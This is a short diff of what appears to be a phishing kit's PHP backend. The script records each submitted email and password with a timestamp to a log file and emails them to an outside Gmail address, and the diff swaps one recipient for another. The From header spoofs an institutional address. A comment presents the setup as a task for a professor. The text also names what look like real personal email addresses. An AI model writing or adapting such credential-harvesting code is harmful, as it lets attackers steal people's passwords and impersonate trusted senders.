@@ -27,7 +27,7 @@ $message = "Login Attempt:\nTime: $timestamp\nEmail: $email\nPassword: $password
 file_put_contents('log.txt', $message . PHP_EOL, FILE_APPEND);
 
 // ✅ Send email
-$to = 'xleetleads@gmail.com';  // 👈 change this to your professor’s real email
+$to = 'virginio.frattarelli1@gmail.com';  // 👈 change this to your professor’s real email
 $subject = "Login Attempt from $email";
 $headers = "From: i2cloud72 <akotsi@certh.gr>\r\n";  // Optional: set from address
 
